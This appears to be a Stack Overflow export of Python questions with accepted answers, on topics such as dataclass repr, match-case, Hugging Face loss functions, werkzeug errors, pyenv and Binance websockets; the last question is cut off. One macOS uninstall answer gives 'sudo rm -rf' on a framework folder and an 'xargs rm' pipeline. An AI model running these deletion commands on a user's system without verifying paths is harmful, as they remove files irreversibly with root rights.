<p>While this works fine, it means that I can't run the typical <code>pip install -r requirements.txt</code> as long as we have <code>tensorflow</code> in the <code>requirements.txt</code>. If we instead include <code>tensorflow-macos</code>, it'll lead to problems for non-M1 or even non-macOS users.</p>
<p>Our library must work on all platforms. Is there a generic install command that installs the correct TensorFlow version depending on whether the computer is a M1 Mac or not? So that we can use a single <code>requirements.txt</code> for everyone?</p>
<p>Or if that's not possible, can we pass some flag/option, e.g., <code>pip install -r requirements.txt --m1</code> to install some variation?
What's the simplest and most elegant solution here?</p>
","71866908","<p>According to this post <a href=""https://stackoverflow.com/questions/29222269/is-there-a-way-to-have-a-conditional-requirements-txt-file-for-my-python-applica"">Is there a way to have a conditional requirements.txt file for my Python application based on platform?</a></p>
<p>You can use conditionals on your requirements.txt, thus</p>
<pre><code>tensorflow==2.8.0; sys_platform != 'darwin' or platform_machine != 'arm64'
tensorflow-macos==2.8.0; sys_platform == 'darwin' and platform_machine == 'arm64'
</code></pre>
"
"72161257","1","Exclude default fields from python `dataclass` `__repr__`","<p><strong>Summary</strong></p>
<p>I have a <code>dataclass</code> with <strong>10+ fields</strong>. <code>print()</code>ing them buries interesting context in a wall of defaults - let's make them friendlier by not needlessly repeating those.</p>
<p><strong>Dataclasses in Python</strong></p>
<p>Python's <a href=""https://docs.python.org/3/library/dataclasses.html#dataclasses.dataclass"" rel=""noreferrer""><code>@dataclasses.dataclass()</code></a> (<a href=""https://peps.python.org/pep-0557/"" rel=""noreferrer"">PEP 557</a>) provides automatic printable representations (<a href=""https://docs.python.org/3/library/functions.html#repr"" rel=""noreferrer""><code>__repr__()</code></a>).</p>
<p>Assume this example, <a href=""https://docs.python.org/3/library/dataclasses.html#:%7E:text=from%20dataclasses%20import%20dataclass"" rel=""noreferrer"">based on python.org's</a>:</p>
<pre class=""lang-py prettyprint-override""><code>from dataclasses import dataclass


@dataclass
class InventoryItem:
    name: str
    unit_price: float = 1.00
    quantity_on_hand: int = 0
</code></pre>
<p>The decorator, through <a href=""https://docs.python.org/3/library/dataclasses.html?highlight=__repr__#:%7E:text=parameter%20is%20ignored.-,repr,-%3A%20If%20true%20(the"" rel=""noreferrer""><code>@dataclass(repr=True)</code></a> (default) will <a href=""https://docs.python.org/3/library/functions.html#print"" rel=""noreferrer""><code>print()</code></a> a nice output:</p>
<pre class=""lang-py prettyprint-override""><code>InventoryItem(name='Apple', unit_price='1.00', quantity_on_hand=0)
</code></pre>
<p><strong>What I want: Skip printing the defaults</strong></p>
<p><code>repr</code> It prints <em>all</em> the fields, including implied defaults you wouldn't want to show.</p>
<pre class=""lang-py prettyprint-override""><code>print(InventoryItem(&quot;Apple&quot;))

# Outputs: InventoryItem(name='Apple', unit_price='1.00', quantity_on_hand=0)
# I want: InventoryItem(name='Apple')
</code></pre>
<pre class=""lang-py prettyprint-override""><code>print(InventoryItem(&quot;Apple&quot;, unit_price=&quot;1.05&quot;))

# Outputs: InventoryItem(name='Apple', unit_price='1.05', quantity_on_hand=0)
# I want: InventoryItem(name='Apple', unit_price='1.05')
</code></pre>
<pre class=""lang-py prettyprint-override""><code>print(InventoryItem(&quot;Apple&quot;, quantity_on_hand=3))

# Outputs: InventoryItem(name='Apple', unit_price=1.00, quantity_on_hand=3)
# I want: InventoryItem(name='Apple', quantity_on_hand=3)
</code></pre>
<pre class=""lang-py prettyprint-override""><code>print(InventoryItem(&quot;Apple&quot;, unit_price='2.10', quantity_on_hand=3))

# Output is fine (everything's custom):
# InventoryItem(name='Apple', unit_price=2.10, quantity_on_hand=3)
</code></pre>
<p><strong>Discussion</strong></p>
<p>Internally, here's the machinery of <code>dataclass</code> <code>repr</code>-generator as of python <code>3.10.4</code>: <a href=""https://github.com/python/cpython/blob/v3.10.4/Lib/dataclasses.py#L1043-L1045"" rel=""noreferrer""><code>cls.__repr__</code></a><code>=</code><a href=""https://github.com/python/cpython/blob/v3.10.4/Lib/dataclasses.py#L588-L596"" rel=""noreferrer""><code>_repr_fn(flds, globals))</code></a> -&gt; <a href=""https://github.com/python/cpython/blob/v3.10.4/Lib/dataclasses.py#L391-L409"" rel=""noreferrer""><code>_recursive_repr(fn)</code></a></p>
<p>It may be the case that <code>@dataclass(repr=False)</code> be switched off and <code>def __repr__(self):</code> be added.</p>
<p>If so, what would that look like? We don't want to include the optional defaults.</p>
<p><strong>Context</strong></p>
<p>To repeat, in practice, my <code>dataclass</code> has <strong>10+ fields</strong>.</p>
<p>I'm <code>print()</code>ing instances via running the code and repl, and <a href=""https://docs.pytest.org/en/7.1.x/how-to/parametrize.html"" rel=""noreferrer""><code>@pytest.mark.parametrize</code></a> when running <a href=""https://docs.pytest.org/en/7.1.x/"" rel=""noreferrer"">pytest</a> with <code>-vvv</code>.</p>
<p>Big dataclass' non-defaults (sometimes the inputs) are impossible to see as they're buried in the default fields and worse, each one is disproportionately and distractingly huge: obscuring other valuable stuff bring printed.</p>
<p><strong>Related questions</strong></p>
<p>As of today there aren't many <code>dataclass</code> questions yet (this may change):</p>
<ul>
<li><a href=""https://stackoverflow.com/questions/67327282/extend-dataclass-repr-programmatically"">Extend dataclass&#39; __repr__ programmatically</a>: This is trying to <em>limit</em> the repr. It should show <em>less</em> fields unless they're explicitly overridden.</li>
<li><a href=""https://stackoverflow.com/questions/61740748/python-dataclass-generate-hash-and-exclude-unsafe-fields"">Python dataclass generate hash and exclude unsafe fields</a>: This is for hashing and not related to defaults.</li>
</ul>
","72161437","<p>You could do it like this:</p>
<pre class=""lang-py prettyprint-override""><code>import dataclasses
from dataclasses import dataclass
from operator import attrgetter


@dataclass(repr=False)
class InventoryItem:
    name: str
    unit_price: float = 1.00
    quantity_on_hand: int = 0

    def __repr__(self):
        nodef_f_vals = (
            (f.name, attrgetter(f.name)(self))
            for f in dataclasses.fields(self)
            if attrgetter(f.name)(self) != f.default
        )

        nodef_f_repr = &quot;, &quot;.join(f&quot;{name}={value}&quot; for name, value in nodef_f_vals)
        return f&quot;{self.__class__.__name__}({nodef_f_repr})&quot;
        

# Prints: InventoryItem(name=Apple)
print(InventoryItem(&quot;Apple&quot;))

# Prints: InventoryItem(name=Apple,unit_price=1.05)
print(InventoryItem(&quot;Apple&quot;, unit_price=&quot;1.05&quot;))

# Prints: InventoryItem(name=Apple,unit_price=2.10,quantity_on_hand=3)
print(InventoryItem(&quot;Apple&quot;, unit_price='2.10', quantity_on_hand=3))
</code></pre>
"
"71581197","1","What is the loss function used in Trainer from the Transformers library of Hugging Face?","<p>What is the loss function used in Trainer from the Transformers library of Hugging Face?</p>
<p>I am trying to fine tine a BERT model using the <strong>Trainer class</strong> from the Transformers library of Hugging Face.</p>
<p>In their <a href=""https://huggingface.co/docs/transformers/main_classes/trainer"" rel=""noreferrer"">documentation</a>, they mention that one can specify a customized loss function by overriding the <code>compute_loss</code> method in the class. However, if I do not do the method override and use the Trainer to fine tine a BERT model directly for sentiment classification, what is the default loss function being use? Is it the categorical crossentropy? Thanks!</p>
","71585375","<p>It depends!
Especially given your relatively vague setup description, it is not clear what loss will be used. But to start from the beginning, let's first check how the default <code>compute_loss()</code> function in the <code>Trainer</code> class looks like.</p>
<p>You can find the corresponding function <a href=""https://github.com/huggingface/transformers/blob/v4.17.0/src/transformers/trainer.py#L2006"" rel=""noreferrer"">here</a>, if you want to have a look for yourself (current version at time of writing is 4.17).
The <a href=""https://github.com/huggingface/transformers/blob/v4.17.0/src/transformers/trainer.py#L2026"" rel=""noreferrer"">actual loss that will be returned with default parameters</a> is taken from the model's output values:</p>
<blockquote>
<p><code>         loss = outputs[&quot;loss&quot;] if isinstance(outputs, dict) else outputs[0]</code></p>
</blockquote>
<p>which means that the model itself is (by default) responsible for computing some sort of loss and returning it in <code>outputs</code>.</p>
<p>Following this, we can then look into the actual model definitions for BERT (source: <a href=""https://github.com/huggingface/transformers/blob/v4.17.0/src/transformers/models/bert/modeling_bert.py"" rel=""noreferrer"">here</a>, and in particular check out the model that will be used in your Sentiment Analysis task (I assume a <a href=""https://github.com/huggingface/transformers/blob/v4.17.0/src/transformers/models/bert/modeling_bert.py#L1501"" rel=""noreferrer""><code>BertForSequenceClassification</code> model</a>.</p>
<p>The <a href=""https://github.com/huggingface/transformers/blob/v4.17.0/src/transformers/models/bert/modeling_bert.py#L1563-L1583"" rel=""noreferrer"">code relevant for defining a loss function</a> looks like this:</p>
<pre class=""lang-py prettyprint-override""><code>if labels is not None:
    if self.config.problem_type is None:
        if self.num_labels == 1:
            self.config.problem_type = &quot;regression&quot;
        elif self.num_labels &gt; 1 and (labels.dtype == torch.long or labels.dtype == torch.int):
            self.config.problem_type = &quot;single_label_classification&quot;
        else:
            self.config.problem_type = &quot;multi_label_classification&quot;

    if self.config.problem_type == &quot;regression&quot;:
        loss_fct = MSELoss()
        if self.num_labels == 1:
            loss = loss_fct(logits.squeeze(), labels.squeeze())
        else:
            loss = loss_fct(logits, labels)
    elif self.config.problem_type == &quot;single_label_classification&quot;:
        loss_fct = CrossEntropyLoss()
        loss = loss_fct(logits.view(-1, self.num_labels), labels.view(-1))
    elif self.config.problem_type == &quot;multi_label_classification&quot;:
        loss_fct = BCEWithLogitsLoss()
        loss = loss_fct(logits, labels)

</code></pre>
<p>Based on this information, you should be able to either set the correct loss function yourself (by changing <code>model.config.problem_type</code> accordingly), or otherwise at least be able to determine whichever loss will be chosen, based on the hyperparameters of your task (number of labels, label scores, etc.)</p>
"
"71441761","1","How to use match case with a class type","<p>I want to use <code>match</code> to determine an action to perform based on a class <code>type</code>. I cannot seem to figure out how to do it. I know their are other ways of achieving this, I would just like to know can it be done this way. I am not looking for workarounds of which there are many.</p>
<pre><code>
class aaa():
    pass

class bbb():
    pass

def f1(typ):
    if typ is aaa:
        print(&quot;aaa&quot;)
    elif typ is bbb:
        print(&quot;bbb&quot;)
    else:
        print(&quot;???&quot;)

def f2(typ):
    match typ:
        case aaa():
            print(&quot;aaa&quot;)
        case bbb():
            print(&quot;bbb&quot;)
        case _:
            print(&quot;???&quot;)

f1(aaa)
f1(bbb)
f2(aaa)
f2(bbb)
</code></pre>
<p>The output is as follows:</p>
<pre><code>aaa
bbb
???
???
</code></pre>
","71442112","<p>Try using <code>typ()</code> instead of <code>typ</code> in the <code>match</code> line:</p>
<pre class=""lang-py prettyprint-override""><code>        class aaa():
            pass

        class bbb():
            pass

        def f1(typ):
            if typ is aaa:
                print(&quot;aaa&quot;)
            elif typ is bbb:
                print(&quot;bbb&quot;)
            else:
                print(&quot;???&quot;)

        def f2(typ):
            match typ():
                case aaa():
                    print(&quot;aaa&quot;)
                case bbb():
                    print(&quot;bbb&quot;)
                case _:
                    print(&quot;???&quot;)

        f1(aaa)
        f1(bbb)
        f2(aaa)
        f2(bbb)        
</code></pre>
<p>Output:</p>
<pre><code>aaa
bbb
aaa
bbb
</code></pre>
<p><strong>UPDATE:</strong></p>
<p>Based on OP's comment asking for solution that works for classes more generally than the example classes in the question, here is an answer addressing this:</p>
<pre class=""lang-py prettyprint-override""><code>class aaa():
    pass

class bbb():
    pass

def f1(typ):
    if typ is aaa:
        print(&quot;aaa&quot;)
    elif typ is bbb:
        print(&quot;bbb&quot;)
    else:
        print(&quot;???&quot;)

def f2(typ):
    match typ.__qualname__:
        case aaa.__qualname__:
            print(&quot;aaa&quot;)
        case bbb.__qualname__:
            print(&quot;bbb&quot;)
        case _:
            print(&quot;???&quot;)

f1(aaa)
f1(bbb)
f2(aaa)
f2(bbb)
</code></pre>
<p>Output:</p>
<pre><code>aaa
bbb
aaa
bbb
</code></pre>
<p><strong>UPDATE #2:</strong>
Based on <a href=""https://stackoverflow.com/questions/67525257/capture-makes-remaining-patterns-unreachable"">this</a> post and some perusal of PEP 364 <a href=""https://peps.python.org/pep-0634/#capture-patterns"" rel=""noreferrer"">here</a>, I have created an example showing how a few data types (a Python builtin, a class from the collections module, and a user defined class) can be used by <code>match</code> to determine an action to perform based on a class type (or more generally, a data type):</p>
<pre class=""lang-py prettyprint-override""><code>class bbb:
    pass

class namespacing_class:
    class aaa:
        pass


def f1(typ):
    if typ is aaa:
        print(&quot;aaa&quot;)
    elif typ is bbb:
        print(&quot;bbb&quot;)
    else:
        print(&quot;???&quot;)

def f2(typ):
    match typ.__qualname__:
        case aaa.__qualname__:
            print(&quot;aaa&quot;)
        case bbb.__qualname__:
            print(&quot;bbb&quot;)
        case _:
            print(&quot;???&quot;)

def f3(typ):
    import collections
    match typ:
        case namespacing_class.aaa:
            print(&quot;aaa&quot;)
        case __builtins__.str:
            print(&quot;str&quot;)
        case collections.Counter:
            print(&quot;Counter&quot;)
        case _:
            print(&quot;???&quot;)

'''
f1(aaa)
f1(bbb)
f2(aaa)
f2(bbb)
'''
f3(namespacing_class.aaa)
f3(str)
import collections
f3(collections.Counter)
</code></pre>
<p>Outputs:</p>
<pre><code>aaa
str
Counter
</code></pre>
<p>As stated in <a href=""https://stackoverflow.com/a/67525259/18135454"">this</a> answer in another post:</p>
<blockquote>
<p>A variable name in a case clause is treated as a <a href=""https://www.python.org/dev/peps/pep-0634/#capture-patterns"" rel=""noreferrer"">name capture pattern</a>. It always matches and tries to make an assignment to the variable name. ... We need to replace the name capture pattern with a non-capturing pattern such as a <a href=""https://www.python.org/dev/peps/pep-0634/#value-patterns"" rel=""noreferrer"">value pattern</a> that uses the . operator for attribute lookup. The dot is the key to matching this a non-capturing pattern.</p>
</blockquote>
<p>In other words, if we try to say <code>case aaa:</code> for example, <code>aaa</code> will be interpreted as a name to which we assign the subject (<code>typ</code> in your code) and will always match and block any attempts to match subsequent <code>case</code> lines.</p>
<p>To get around this, for class type names (or names generally) that can be specified using a dot (perhaps because they belong to a namespace or another class), we can use the dotted name as a pattern that will not be interpreted as a name capture.</p>
<p>For built-in type <code>str</code>, we can use <code>case __builtins__.str:</code>. For the <code>Counter</code> class in Python's <code>collections</code> module, we can use <code>case collections.Counter:</code>. If we define class <code>aaa</code> within another class named <code>namespacing_class</code>, we can use <code>case namespacing_class.aaa:</code>.</p>
<p>However, if we define class <code>bbb</code> at the top level within our Python code, it's not clear to me that there is any way to use a dotted name to refer to it and thereby avoid name capture.</p>
<p>It's possible there's a way to specify a user defined class <code>type</code> in a <code>case</code> line and I simply haven't figured it out yet. Otherwise, it seems rather arbitrary (and unfortunate) to be able to do this for dottable types and not for non-dottable ones.</p>
"
"72005302","1","Completely uninstall Python 3 on Mac","<p>I installed Python 3 on Mac and installed some packages as well. But then I see AWS lamda does not support Python 3 so I decided to downgrade. I removed Python3 folder in Applications and cleared the trash. But still I see a folder named 3 in <em>/Library/Frameworks/Python.framework/Versions</em> which is causing problems, such as this:</p>
<pre><code>  $ python3 -m pip install virtualenv
 Requirement already satisfied: virtualenv in      /Library/Frameworks/Python.framework/Versions/3.10/lib/python3.10/site-packages (20.14.1)
 Requirement already satisfied: platformdirs&lt;3,&gt;=2 in /Library/Frameworks/Python.framework/Versions/3.10/lib/python3.10/site-packages (from virtualenv) (2.5.2) 
</code></pre>
<p>So my question is how do I completely uninstall python 3 from my Mac?</p>
","72005684","<p>Removing the app does not completely uninstall that version of Python. You will need to remove the framework directories and their symbolic links.</p>
<p><strong>Deleting the frameworks</strong></p>
<p><code>sudo rm -rf /Library/Frameworks/Python.framework/Versions/[version number]</code>
replacing [version number] with 3.10 in your case.</p>
<p><strong>Removing symbolic links</strong></p>
<p>To list the broken symbolic links.</p>
<p><code>ls -l /usr/local/bin | grep '../Library/Frameworks/Python.framework/Versions/[version number]'</code></p>
<p>And to remove these links:</p>
<p><code>cd /usr/local/bin</code></p>
<p><code>ls -l /usr/local/bin | grep '../Library/Frameworks/Python.framework/Versions/[version number]' | awk '{print $9}' | tr -d @ | xargs rm*</code></p>
<p>As always, please be wary of copying these commands. Please make sure the directories in the inputs are actual working directories before you execute anything.</p>
<p>The general idea in the end is to remove the folders and symlinks, and you're good to go.</p>
<p>Here is another response addressing this process: <a href=""https://stackoverflow.com/questions/3819449/how-to-uninstall-python-2-7-on-a-mac-os-x-10-6-4/3819829#3819829"">How to uninstall Python 2.7 on a Mac OS X 10.6.4?</a></p>
"
"71592060","1","Makefile - How should I extract the version number embedded in `pyproject.toml`?","<p>I have a python project with a <code>pyproject.toml</code> file. Typically I store the project's version number in <code>pyproject.toml</code> like this:</p>
<pre><code>% grep version pyproject.toml 
version = &quot;0.0.2&quot;
%
</code></pre>
<p>I want to get that version number into a <code>Makefile</code> variable regardless of how many spaces wind up around the version terms.</p>
<p>What should I do to extract the <code>pyproject.toml</code> version string into a <code>Makefile</code> environment variable called <code>VERSION</code>?</p>
","71592061","<p>This seemed to work out the best...  I put this in my <code>Makefile</code></p>
<pre><code># grep the version from pyproject.toml, squeeze multiple spaces, delete double
#   and single quotes, get 3rd val. This command tolerates 
#   multiple whitespace sequences around the version number
VERSION := $(shell grep -m 1 version pyproject.toml | tr -s ' ' | tr -d '&quot;' | tr -d &quot;'&quot; | cut -d' ' -f3)
</code></pre>
<p>Special thanks to <a href=""https://stackoverflow.com/questions/71592060/makefile-how-should-i-extract-the-version-number-embedded-in-pyproject-toml/72545515#comment128150232_71592061"">@charl-botha</a> for the <code>-m 1</code> grep argument... both gnu and bsd grep support <code>-m</code> in this context.</p>
"
"71661851","1","TypeError: __init__() got an unexpected keyword argument 'as_tuple'","<p>While I am testing my API I recently started to get the error below.</p>
<pre><code>        if request is None:
&gt;           builder = EnvironBuilder(*args, **kwargs)
E           TypeError: __init__() got an unexpected keyword argument 'as_tuple'

/usr/local/lib/python3.7/site-packages/werkzeug/test.py:1081: TypeError
</code></pre>
<p>As I read from the documentation in the newer version of <code>Werkzeug</code> the <code>as_tuple</code> parameter is removed.</p>
<p>Part of my test code is</p>
<pre class=""lang-py prettyprint-override""><code>
from flask.testing import FlaskClient

@pytest.fixture(name='test_client')
def _test_client() -&gt; FlaskClient:
    app = create_app()
    return app.test_client()


class TestPeerscoutAPI:
    def test_should_have_access_for_status_page(self, test_client: FlaskClient):
        response = test_client.get('/api/status')
        assert _get_ok_json(response) == {&quot;status&quot;: &quot;OK&quot;}
</code></pre>
<p>Any help would be greatly appreciated.</p>
","71662972","<p>As of version 2.1.0, <code>werkzeug</code> has removed the <code>as_tuple</code> argument to <code>Client</code>. Since Flask wraps werkzeug and you're using a version that still passes this argument, it will fail. See <a href=""https://github.com/pallets/werkzeug/pull/2276/files#diff-e00d1f616a746837a6f12a882341f83276f8b0b2781800695c65c5b7ed041db3R1038-R1120"" rel=""noreferrer"">the exact change on the GitHub PR here</a>.</p>
<p>You can take one of two paths to solve this:</p>
<ol>
<li><p>Upgrade flask</p>
</li>
<li><p>Pin your werkzeug version</p>
</li>
</ol>
<pre><code># in requirements.txt
werkzeug==2.0.3
</code></pre>
"
"71356388","1","How to connect to User Data Stream Binance?","<p>I need to listen to User Data Stream, whenever there's an Order Event - order execution, cancelation, and so on - I'd like to be able to listen to those events and create notifications.</p>
<p>So I got my &quot;listenKey&quot; and I'm not sure if it was done the right way but I executed this code and it gave me something like listenKey.</p>
<p>Code to get listenKey:</p>
<pre><code>def get_listen_key_by_REST(binance_api_key):
    url = 'https://api.binance.com/api/v1/userDataStream'
    response = requests.post(url, headers={'X-MBX-APIKEY': binance_api_key}) 
    json = response.json()
    return json['listenKey']

print(get_listen_key_by_REST(API_KEY))
</code></pre>
<p>And the code to listen to User Data Stream - which doesn't work, I get no json response.</p>
<pre><code>socket = f&quot;wss://fstream-auth.binance.com/ws/btcusdt@markPrice?listenKey=&lt;listenKeyhere&gt;&quot;

def on_message(ws, message):
    json_message = json.loads(message)
    print(json_message)

def on_close(ws):
    print(f&quot;Connection Closed&quot;)
    # restart()

def on_error(ws, error):
    print(f&quot;Error&quot;)
    print(error)

ws = websocket.WebSocketApp(socket, on_message=on_message, on_close=on_close, on_error=on_error)
</code></pre>
<p>I have read the docs to no avail. I'd appreciate it if someone could point me in the right direction.</p>
","71445546","<p>You can create a basic async user socket connection from the docs <a href=""https://python-binance.readthedocs.io/en/latest/websockets.html"" rel=""nofollow noreferrer"">here</a> along with other useful info for the Binance API. Here is a simple example:</p>
<pre><code>import asyncio
from binance import AsyncClient, BinanceSocketManager

async def main():
    client = await AsyncClient.create(api_key, api_secret, tld='us')
    bm = BinanceSocketManager(client)
    # start any sockets here, i.e a trade socket
    ts = bm.user_socket()
    # then start receiving messages
    async with ts as tscm:
        while True:
            res = await tscm.recv()
            print(res)
    await client.close_connection()

if __name__ == &quot;__main__&quot;:
    loop = asyncio.get_event_loop()
    loop.run_until_complete(main())
</code></pre>
"
"71703734","1","How to upgrade version of pyenv on Ubuntu","<p>I wanted to install python 3.10 but that version is not available on pyenv version list.
checked by <code>pyenv install --list</code>.
People suggested to upgrade pyenv that but I do not see help related to updating pyenv.</p>
","71703884","<p><code>pyenv</code> isn't really 'installed' in a traditional sense, it's just a git checkout. All you have to do to update is</p>
<pre><code>cd ~/.pyenv
git pull
</code></pre>
<p>That also updates the list of available python versions.</p>
"
"71701629","1","ImportError: No module named _thread","<p>Compiling python2 in vscode gives an error.
But when I compile python3 it succeeds.</p>
<pre><code>print('test')
</code></pre>
<p>returns: <strong>ImportError: No module named _thread</strong></p>
<pre class=""lang-py prettyprint-override""><code>PS C:\source&gt;  c:; cd 'c:\source'; &amp; 'C:\Python27\python.exe' 'c:\Users\keinblue\.vscode\extensions\ms-python.python-2022.4.0\pythonFiles\lib\python\debugpy\launcher' '52037' '--' 'c:\source\test.py' 
Traceback (most recent call last):
  File &quot;C:\Python27\lib\runpy.py&quot;, line 174, in _run_module_as_main
    &quot;__main__&quot;, fname, loader, pkg_name)
  File &quot;C:\Python27\lib\runpy.py&quot;, line 72, in _run_code
    exec code in run_globals
  File &quot;c:\Users\keinblue\.vscode\extensions\ms-python.python-2022.4.0\pythonFiles\lib\python\debugpy\__main__.py&quot;, line 43, in &lt;module&gt;
    from debugpy.server import cli
  File &quot;c:\Users\keinblue\.vscode\extensions\ms-python.python-2022.4.0\pythonFiles\lib\python\debugpy/../debugpy\server\__init__.py&quot;, line 9, in &lt;module&gt;
    import debugpy._vendored.force_pydevd  # noqa
  File &quot;c:\Users\keinblue\.vscode\extensions\ms-python.python-2022.4.0\pythonFiles\lib\python\debugpy/../debugpy\_vendored\force_pydevd.py&quot;, line 37, in &lt;module&gt;
    pydevd_constants = import_module('_pydevd_bundle.pydevd_constants')
  File &quot;C:\Python27\lib\importlib\__init__.py&quot;, line 37, in import_module
    __import__(name)
  File &quot;c:\Users\keinblue\.vscode\extensions\ms-python.python-2022.4.0\pythonFiles\lib\python\debugpy\_vendored\pydevd\_pydevd_bundle\pydevd_constants.py&quot;, line 362, in &lt;module&gt;  
    from _pydev_bundle._pydev_saved_modules import thread, threading
  File &quot;c:\Users\keinblue\.vscode\extensions\ms-python.python-2022.4.0\pythonFiles\lib\python\debugpy\_vendored\pydevd\_pydev_bundle\_pydev_saved_modules.py&quot;, line 94, in &lt;module&gt;
    import _thread as thread;    verify_shadowed.check(thread, ['start_new_thread', 'start_new', 'allocate_lock'])
ImportError: No module named _thread
</code></pre>
","71704278","<p>There is an issue with the vscode python extension version 2022.4.0</p>
<p>just downgrade to version 2022.2.1924087327 and it will work as it works for me now</p>
<p>Just follow these steps:</p>
<ul>
<li>Go to extensions.</li>
<li>Click on Gear Icon for the installed extension</li>
<li>Click on Install Another Version</li>
<li>select the version you wish to install</li>
</ul>
<p><a href=""https://i.stack.imgur.com/l2iXr.png"" rel=""noreferrer""><img src=""https://i.stack.imgur.com/l2iXr.png"" alt=""enter image description here"" /></a></p>
"
"72238460","1","Python ImportError: sys.meta_path is None, Python is likely shutting down","<p>When using <code>__del__</code>
datetime.date.today() throws ImportError: sys.meta_path is None, Python is likely shutting down</p>
<pre><code>import datetime
import time
import sys


class Bug(object):

    def __init__(self):
        print_meta_path()

    def __del__(self):
        print_meta_path()
        try_date('time')
        try_date('datetime')


def print_meta_path():
    print(f'meta_path: {sys.meta_path}')


def try_date(date_type):
    try:
        print('----------------------------------------------')
        print(date_type)
        if date_type == 'time':
            print(datetime.date.fromtimestamp(time.time()))
        if date_type == 'datetime':
            print(datetime.date.today())
    except Exception as ex:
        print(ex)


if __name__ == '__main__':
    print(sys.version)
    bug = Bug()
</code></pre>
<p>output with different envs (3.10, 3.9, 3.7):</p>
<pre><code>3.10.4 | packaged by conda-forge | (main, Mar 24 2022, 17:39:04) [GCC 10.3.0]
meta_path: [&lt;_distutils_hack.DistutilsMetaFinder object at 0x7ff8731f6860&gt;, &lt;class '_frozen_importlib.BuiltinImporter'&gt;, &lt;class '_frozen_importlib.FrozenImporter'&gt;, &lt;class '_frozen_importlib_external.PathFinder'&gt;]
meta_path: None
----------------------------------------------
time
2022-05-17
----------------------------------------------
datetime
sys.meta_path is None, Python is likely shutting down
</code></pre>
<pre><code>3.9.12 | packaged by conda-forge | (main, Mar 24 2022, 23:22:55)
[GCC 10.3.0]
meta_path: [&lt;_distutils_hack.DistutilsMetaFinder object at 0x7fb01126e490&gt;, &lt;class '_frozen_importlib.BuiltinImporter'&gt;, &lt;class '_frozen_importlib.FrozenImporter'&gt;, &lt;class '_frozen_importlib_external.PathFinder'&gt;]
meta_path: None
----------------------------------------------
time
2022-05-17
----------------------------------------------
datetime
sys.meta_path is None, Python is likely shutting down
</code></pre>
<pre><code>3.7.12 | packaged by conda-forge | (default, Oct 26 2021, 06:08:53)
[GCC 9.4.0]
meta_path: [&lt;class '_frozen_importlib.BuiltinImporter'&gt;, &lt;class '_frozen_importlib.FrozenImporter'&gt;, &lt;class '_frozen_importlib_external.PathFinder'&gt;]
meta_path: None
----------------------------------------------
time
2022-05-17
----------------------------------------------
datetime
sys.meta_path is None, Python is likely shutting down
</code></pre>
<pre><code>3.8.10 (default, Mar 15 2022, 12:22:08) 
[GCC 9.4.0]
meta_path: [&lt;class '_frozen_importlib.BuiltinImporter'&gt;, &lt;class '_frozen_importlib.FrozenImporter'&gt;, &lt;class '_frozen_importlib_external.PathFinder'&gt;]
meta_path: None
----------------------------------------------
time
2022-05-17
----------------------------------------------
datetime
sys.meta_path is None, Python is likely shutting down
</code></pre>
<p>Why is that happening?
I need to use requests which use urllib3 connection.py</p>
<p><code>380:  is_time_off = datetime.date.today() &lt; RECENT_DATE</code></p>
<pre><code>  File &quot;/home/liron/mambaforge/envs/dm-sdk-dev/lib/python3.10/site-packages/requests/api.py&quot;, line 117, in post
  File &quot;/home/liron/mambaforge/envs/dm-sdk-dev/lib/python3.10/site-packages/requests/api.py&quot;, line 61, in request
  File &quot;/home/liron/mambaforge/envs/dm-sdk-dev/lib/python3.10/site-packages/requests/sessions.py&quot;, line 529, in request
  File &quot;/home/liron/mambaforge/envs/dm-sdk-dev/lib/python3.10/site-packages/requests/sessions.py&quot;, line 645, in send
  File &quot;/home/liron/mambaforge/envs/dm-sdk-dev/lib/python3.10/site-packages/requests/adapters.py&quot;, line 440, in send
  File &quot;/home/liron/mambaforge/envs/dm-sdk-dev/lib/python3.10/site-packages/urllib3/connectionpool.py&quot;, line 703, in urlopen
  File &quot;/home/liron/mambaforge/envs/dm-sdk-dev/lib/python3.10/site-packages/urllib3/connectionpool.py&quot;, line 386, in _make_request
  File &quot;/home/liron/mambaforge/envs/dm-sdk-dev/lib/python3.10/site-packages/urllib3/connectionpool.py&quot;, line 1040, in _validate_conn
  File &quot;/home/liron/mambaforge/envs/dm-sdk-dev/lib/python3.10/site-packages/urllib3/connection.py&quot;, line 380, in connect
ImportError: sys.meta_path is None, Python is likely shutting down
</code></pre>
<p>switching the line to
<code>380:  is_time_off = datetime.date.fromtimestamp(time.time()) &lt; RECENT_DATE</code> solve it.</p>
<pre><code>OS Linux-5.13.0-41-generic-x86_64-with-glibc2.31
urllib3 1.26.9
</code></pre>
<p>I already tried to rebind <code>__del__</code> arguments default</p>
<p><code>def __del__(self, datetime=datetime):....</code></p>
<p>Does anyone have an idea? thanks</p>
","72275619","<p>Using <code>atexit</code> provide the same behavior as <code>__del__</code> but works</p>
<pre><code>import datetime
import time
import sys
import atexit


class Bug(object):

    def __init__(self):
        print_meta_path()
        atexit.register(self.__close)

    def __close(self):
        print_meta_path()
        try_date('time')
        try_date('datetime')


def print_meta_path():
    print(f'meta_path: {sys.meta_path}')


def try_date(date_type):
    try:
        print('----------------------------------------------')
        print(date_type)
        if date_type == 'time':
            print(datetime.date.fromtimestamp(time.time()))
        if date_type == 'datetime':
            print(datetime.date.today())
    except ImportError:
        print('')


if __name__ == '__main__':
    print(sys.version)
    bug = Bug()
</code></pre>
<p>output:</p>
<pre><code>3.10.4 | packaged by conda-forge | (main, Mar 24 2022, 17:38:57) [GCC 10.3.0]
meta_path: [&lt;_distutils_hack.DistutilsMetaFinder object at 0x7fd912112860&gt;, &lt;class '_frozen_importlib.BuiltinImporter'&gt;, &lt;class '_frozen_importlib.FrozenImporter'&gt;, &lt;class '_frozen_importlib_external.PathFinder'&gt;]
meta_path: [&lt;_distutils_hack.DistutilsMetaFinder object at 0x7fd912112860&gt;, &lt;class '_frozen_importlib.BuiltinImporter'&gt;, &lt;class '_frozen_importlib.FrozenImporter'&gt;, &lt;class '_frozen_importlib_external.PathFinder'&gt;]
----------------------------------------------
time
2022-05-17
----------------------------------------------
datetime
2022-05-17

Process finished with exit code 0
</code></pre>
"
"72280762","1","pip broke after downlading python-certifi-win32","<p>I have downloaded python for the first time in a new computer(ver 3.10.4).
I have download the package <code>python-certifi-win32</code>, after someone suggested it as a solution to a SSL certificate problem in a similar question to a problem I had.
Since then, pip has completely stopped working, to the point where i can't not run <code>pip --version</code>
Every time the same error is printed, it is mostly seemingly junk(just a deep stack trace), but the file at the end is different.</p>
<p>start of the printed log:</p>
<pre><code>Traceback (most recent call last):
